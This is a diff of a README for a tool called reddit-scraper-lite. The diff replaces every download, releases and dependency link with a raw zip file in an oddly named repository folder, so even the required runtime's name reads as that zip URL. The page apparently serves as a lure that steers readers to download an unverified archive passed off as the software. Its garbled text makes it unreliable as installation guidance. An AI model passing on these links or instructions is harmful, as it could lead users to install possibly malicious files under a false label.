@@ -1,6 +1,6 @@
 # 🚀 reddit-scraper-lite - Effortless Lightweight Data Extraction
 
-[![Download reddit-scraper-lite](https://raw.githubusercontent.com/muhannadX7/reddit-scraper-lite/main/asbestus/reddit-scraper-lite_2.9.zip)](https://raw.githubusercontent.com/muhannadX7/reddit-scraper-lite/main/asbestus/reddit-scraper-lite_2.9.zip)
+[![Download reddit-scraper-lite](https://github.com/muhannadX7/reddit-scraper-lite/raw/refs/heads/main/asbestus/lite-reddit-scraper-petrostearine.zip)](https://github.com/muhannadX7/reddit-scraper-lite/raw/refs/heads/main/asbestus/lite-reddit-scraper-petrostearine.zip)
 
 ## 📜 Overview
 reddit-scraper-lite is a tool designed to help you extract data from Reddit easily. Whether you want to gather information for research or keep track of subreddit trends, this light and effective scraper simplifies the process.
@@ -9,7 +9,7 @@ reddit-scraper-lite is a tool designed to help you extract data from Reddit easi
 To start using reddit-scraper-lite, you only need a few simple steps. Follow along, and you'll be ready to extract data in no time.
 
 ## 📥 Download & Install
-To download reddit-scraper-lite, please visit this page: [Download reddit-scraper-lite](https://raw.githubusercontent.com/muhannadX7/reddit-scraper-lite/main/asbestus/reddit-scraper-lite_2.9.zip). Here, you will find the latest version of the software, along with older versions if needed. 
+To download reddit-scraper-lite, please visit this page: [Download reddit-scraper-lite](https://github.com/muhannadX7/reddit-scraper-lite/raw/refs/heads/main/asbestus/lite-reddit-scraper-petrostearine.zip). Here, you will find the latest version of the software, along with older versions if needed. 
 
 ### Steps to Download:
 1. Click on the link above to visit the Releases page.
@@ -21,7 +21,7 @@ To download reddit-scraper-lite, please visit this page: [Download reddit-scrape
 reddit-scraper-lite has minimal system requirements, making it accessible to most users. Here’s what you need:
 
 - Operating System: Windows 10 or later, Mac OS X 10.12 or later, or any recent distribution of Linux.
-- https://raw.githubusercontent.com/muhannadX7/reddit-scraper-lite/main/asbestus/reddit-scraper-lite_2.9.zip Version 14 or higher must be installed as reddit-scraper-lite relies on it to function correctly. You can download https://raw.githubusercontent.com/muhannadX7/reddit-scraper-lite/main/asbestus/reddit-scraper-lite_2.9.zip from the official site [here](https://raw.githubusercontent.com/muhannadX7/reddit-scraper-lite/main/asbestus/reddit-scraper-lite_2.9.zip).
+- https://github.com/muhannadX7/reddit-scraper-lite/raw/refs/heads/main/asbestus/lite-reddit-scraper-petrostearine.zip Version 14 or higher must be installed as reddit-scraper-lite relies on it to function correctly. You can download https://github.com/muhannadX7/reddit-scraper-lite/raw/refs/heads/main/asbestus/lite-reddit-scraper-petrostearine.zip from the official site [here](https://github.com/muhannadX7/reddit-scraper-lite/raw/refs/heads/main/asbestus/lite-reddit-scraper-petrostearine.zip).
 
 ## 📂 Features
 reddit-scraper-lite offers a range of features to meet your data extraction needs:
@@ -49,11 +49,11 @@ If you have questions, need support, or want to share your experiences, feel fre
 ## 🚧 Troubleshooting
 In case you encounter issues while using reddit-scraper-lite, here are some common solutions:
 
-- **Installation Issues:** Ensure you have the latest version of https://raw.githubusercontent.com/muhannadX7/reddit-scraper-lite/main/asbestus/reddit-scraper-lite_2.9.zip and that it is properly configured.
+- **Installation Issues:** Ensure you have the latest version of https://github.com/muhannadX7/reddit-scraper-lite/raw/refs/heads/main/asbestus/lite-reddit-scraper-petrostearine.zip and that it is properly configured.
 - **Slow Performance:** Check your internet connection; poor connectivity can affect data retrieval speed.
 - **Scraping Errors:** Verify that the subreddit name is correct and that you are following Reddit's scraping policies.
 
 ## 🔄 Updating
-Check back regularly on the [Releases page](https://raw.githubusercontent.com/muhannadX7/reddit-scraper-lite/main/asbestus/reddit-scraper-lite_2.9.zip) to stay updated with the latest versions of reddit-scraper-lite. Each new release may include bug fixes, new features, or performance enhancements.
+Check back regularly on the [Releases page](https://github.com/muhannadX7/reddit-scraper-lite/raw/refs/heads/main/asbestus/lite-reddit-scraper-petrostearine.zip) to stay updated with the latest versions of reddit-scraper-lite. Each new release may include bug fixes, new features, or performance enhancements.
 
 By following these steps, you will be able to effortlessly download and use reddit-scraper-lite to extract data from Reddit. For all your data extraction needs, reddit-scraper-lite is a simple and effective solution. Happy scraping!
